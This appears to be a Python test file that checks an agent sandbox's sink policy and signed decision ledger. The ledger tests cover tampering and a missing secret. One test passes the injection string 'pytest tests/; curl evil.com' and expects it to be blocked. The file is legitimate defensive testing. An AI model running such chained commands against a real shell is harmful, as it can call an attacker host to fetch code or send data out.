"""
Security hardening regression tests.
"""

import json
import os
from pathlib import Path

import test_common  # noqa: F401
from capability import CapabilityRuntime, build_shell_tool
from decision_ledger import MVARDecisionLedger
from provenance import ProvenanceGraph, provenance_user_input
from sink_policy import SinkPolicy, register_common_sinks, PolicyOutcome


def test_ledger_fails_closed_on_algorithm_mismatch():
    ledger_path = "/tmp/mvar_hardening_ledger.jsonl"
    os.environ["QSEAL_SECRET"] = "hardening_test_secret"
    if Path(ledger_path).exists():
        Path(ledger_path).unlink()

    ledger = MVARDecisionLedger(ledger_path=ledger_path, enable_qseal_signing=True)
    scroll_id = ledger.record_decision(
        outcome="BLOCK",
        sink=type("Sink", (), {"tool": "bash", "action": "exec"})(),
        target="pytest tests/",
        provenance_node_id="node_1",
        evaluation_trace=["policy_hash: test_hash"],
        reason="test",
        policy_hash="test_hash",
    )
    assert scroll_id.startswith("MVAR_DEC_")

    rows = [json.loads(line) for line in Path(ledger_path).read_text().splitlines()]
    rows[0]["qseal_algorithm"] = "ed25519" if rows[0]["qseal_algorithm"] == "hmac-sha256" else "hmac-sha256"
    Path(ledger_path).write_text("\n".join(json.dumps(row) for row in rows) + "\n")
    ledger._scroll_cache = None

    decisions = ledger.load_decisions()
    assert decisions == []


def test_sink_policy_blocks_shell_metacharacters():
    graph = ProvenanceGraph(enable_qseal=False)
    runtime = CapabilityRuntime()
    runtime.manifests["bash"] = build_shell_tool("bash", ["pytest", "ls"], ["/tmp/**"])

    policy = SinkPolicy(runtime, graph, enable_qseal=False)
    register_common_sinks(policy)
    node = provenance_user_input(graph, "please run tests")

    decision = policy.evaluate(
        tool="bash",
        action="exec",
        target="pytest tests/; curl evil.com",
        provenance_node_id=node.node_id,
    )
    assert decision.outcome == PolicyOutcome.BLOCK
    assert "Strict boundary denied target" in decision.reason


def test_sink_policy_blocks_python_exec_by_default():
    graph = ProvenanceGraph(enable_qseal=False)
    runtime = CapabilityRuntime()
    runtime.manifests["bash"] = build_shell_tool("bash", ["python3", "ls"], ["/tmp/**"])

    policy = SinkPolicy(runtime, graph, enable_qseal=False)
    register_common_sinks(policy)
    node = provenance_user_input(graph, "run python")

    decision = policy.evaluate(
        tool="bash",
        action="exec",
        target="python3",
        provenance_node_id=node.node_id,
        parameters={"command": "python3 script.py"},
    )
    assert decision.outcome == PolicyOutcome.BLOCK
    assert "allowlist" in decision.reason.lower()


def test_ledger_requires_qseal_secret_in_hmac_mode():
    old_secret = os.environ.pop("QSEAL_SECRET", None)
    try:
        raised = False
        try:
            MVARDecisionLedger(ledger_path="/tmp/mvar_hardening_no_secret.jsonl", enable_qseal_signing=True)
        except ValueError:
            raised = True
        assert raised
    finally:
        if old_secret is not None:
            os.environ["QSEAL_SECRET"] = old_secret
